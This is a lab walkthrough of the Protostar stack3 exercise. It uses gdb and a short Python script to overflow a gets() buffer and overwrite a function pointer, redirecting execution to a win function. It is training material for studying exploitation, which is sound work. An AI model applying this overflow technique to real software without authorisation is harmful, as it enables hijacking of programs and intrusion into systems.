# Buffer Overflows Can Redirect Program Execution - bin 0x0D

## Target Exercises

- [stack3](https://exploit-exercises.lains.space/protostar/stack3/)

## Usage

Download `exploit-exercises-protostar-2.iso` from the [Protostar Google Drive directory](https://drive.google.com/folderview?id=0B9RbZkKdRR8qbkJjQ2VXbWNlQzg&usp=sharing).

```
/bin/bash
/opt/protostar/bin/stack3
AAAA
```

## Instructions

Use `gdb` to e(x)amine or (p)rint where the `win` function lies in memory (here `0x8048424`). Then `set disassembly-flavor intel` and `disassemble main` to see what `main` does.
```
user@protostar:~$ gdb /opt/protostar/bin/stack3
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack3...done.
(gdb) x win
0x8048424 <win>:	0x83e58955
(gdb) p win
$1 = {void (void)} 0x8048424 <win>
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x08048438 <main+0>:	push   ebp
0x08048439 <main+1>:	mov    ebp,esp
0x0804843b <main+3>:	and    esp,0xfffffff0
0x0804843e <main+6>:	sub    esp,0x60
0x08048441 <main+9>:	mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:	lea    eax,[esp+0x1c]
0x0804844d <main+21>:	mov    DWORD PTR [esp],eax
0x08048450 <main+24>:	call   0x8048330 <gets@plt>
0x08048455 <main+29>:	cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:	je     0x8048477 <main+63>
0x0804845c <main+36>:	mov    eax,0x8048560
0x08048461 <main+41>:	mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:	mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:	mov    DWORD PTR [esp],eax
0x0804846c <main+52>:	call   0x8048350 <printf@plt>
0x08048471 <main+57>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:	call   eax
0x08048477 <main+63>:	leave
0x08048478 <main+64>:	ret
End of assembler dump.
(gdb)
```

Exactly like `stack0`, it makes space for 0x60 (96) bytes on the stack. Then it sets `esp+0x5c` to `0` so that it is the location of the `fp` variable. After the `gets` it checks whether the value at `esp+0x5c` is still `0`. If not, it loads the value into `eax` and calls that address, effectively calling `fp` (and `win` if the addresses match).

Let's set a breakpoint at just before this last call at `0x08048475`. Then (r)un the program and enter enough characters to overwrite the value of `fp` on the stack. Display the registers to confirm `eax` is set to `Ox41414141` (the ASCII value of the capital A's):
```
(gdb) break *0x08048475
Breakpoint 1 at 0x8048475: file stack3/stack3.c, line 22.
(gdb) r
Starting program: /opt/protostar/bin/stack3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
calling function pointer, jumping to 0x41414141

Breakpoint 1, 0x08048475 in main (argc=1, argv=0xbffff824) at stack3/stack3.c:22
22	stack3/stack3.c: No such file or directory.
	in stack3/stack3.c
(gdb) info registers
eax            0x41414141	1094795585
ecx            0x0	0
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff710	0xbffff710
ebp            0xbffff778	0xbffff778
esi            0x0	0
edi            0x0	0
eip            0x8048475	0x8048475 <main+61>
eflags         0x200292	[ AF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb)
```

Confirm the next instruction tries to call this address and fails with a Segmentation Fault because the memory there does not contain anything valid.
```
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info registers
eax            0x41414141	1094795585
ecx            0x0	0
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff70c	0xbffff70c
ebp            0xbffff778	0xbffff778
esi            0x0	0
edi            0x0	0
eip            0x41414141	0x41414141
eflags         0x210292	[ AF SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb)
```

Open a second SSH session in a separate terminal to create a Python script for our exploit:
```
cd /tmp
vim stack.py
```

Let's first try to figure out which offset controls `eax` by printing a recognizable pattern:
```
print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
```

Pipe this output to a file so we do not have to type it every time:
```
python stack.py > exp
```

Then feed the file to `stack3` in  `gdb` with:
```
(gdb) r < /tmp/exp
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/stack3 < /tmp/exp
calling function pointer, jumping to 0x51515151

Breakpoint 1, 0x08048475 in main (argc=1448498774, argv=0x57575757)
    at stack3/stack3.c:22
22	in stack3/stack3.c
(gdb)
```

Note how `eax` is filled with `Ox51`'s, the ASCII value of capital Q, as confirmed by chr(0x51) in a python prompt:
```
Python 2.6.6 (r266:84292, Dec 27 2010, 00:02:40)
[GCC 4.4.5] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> chr(0x51)
'Q'
>>>
```

So now we know which offset modifies `eax`. Let's rewrite the code in `stack.py` a little bit:
```
# The characters before the capital Q's are irrelevant, just for padding
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
# Now insert the address of the function to call, in little endian (so in reverse compared to the output of `x win` in gdb)
padding += "\x24\x84\x04\x08" # 0x8048424 (not the extra zero at the beginning as the address is only 7-character long)
print padding
```

Save the output to `/tmp/exp` again and feed it to `stack3` to confirm `eax` contains the address of `win`:
```
(gdb) r < /tmp/exp
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/stack3 < /tmp/exp
calling function pointer, jumping to 0x08048424

Breakpoint 1, 0x08048475 in main (argc=1, argv=0xbffff824) at stack3/stack3.c:22
22	in stack3/stack3.c
(gdb) info registers
eax            0x8048424	134513700
ecx            0x0	0
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff710	0xbffff710
ebp            0xbffff778	0xbffff778
esi            0x0	0
edi            0x0	0
eip            0x8048475	0x8048475 <main+61>
eflags         0x200292	[ AF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb)
```

Let's (c)ontinue to confirm we get `code flow successfully changed`:
```
(gdb) c
Continuing.
code flow successfully changed

Program exited with code 037.
(gdb)
```
